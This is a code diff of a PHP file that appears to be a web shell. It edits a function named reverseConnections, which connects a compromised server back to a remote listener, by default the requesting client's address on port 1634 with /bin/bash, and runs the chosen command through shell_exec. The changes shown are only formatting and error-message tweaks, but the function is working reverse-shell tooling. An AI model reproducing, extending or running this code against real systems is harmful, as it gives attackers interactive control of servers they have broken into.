@@ -161,7 +161,7 @@ function showEnv($os)
 
 function reverseConnections($methods, $host, $port, $shell)
 {
-    $errorNum = error_get_last();
+//    $errorNum = error;
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
     $defaultShell = "/bin/bash";
@@ -174,19 +174,19 @@ function reverseConnections($methods, $host, $port, $shell)
     if (empty($host)) {
         echo "\nHost was empty, using: " . $defaultHost . "\n";
         $useHost = $defaultHost;
-    }else{
+    } else {
         $useHost = $host;
     }
     if (empty($shell)) {
         echo "\nShell was empty, using default: " . $defaultShell . "\n";
         $useShell = $defaultShell;
-    }else{
+    } else {
         $useShell = $shell;
     }
     if (empty($port)) {
         echo "\nPort was empty, using default: " . $defaultPort . "\n";
         $usePort = $defaultPort;
-    }else{
+    } else {
         $usePort = $port;
     }
     $comma = array(
@@ -204,11 +204,11 @@ function reverseConnections($methods, $host, $port, $shell)
         echo "\nAttempting to connect back, ensure you have the listener running.\n";
         echo "\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n";
 
-        shell_exec($comma[$methods]) || die("Something went wrong: ->" . $errorNum . "\r\n\r\n\r\n");
+        shell_exec($comma[$methods]) || die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
     } else {
         echo "\nYou didnt specify a method to use, defaulting to bash.\n";
         echo "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n";
-        shell_exec($defaultAction) || die("\nThere was an error at the connection\n->Error\n" . $errorNum . "\r\n\r\n\r\n");
+        shell_exec($defaultAction) || die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
     }
 }
 
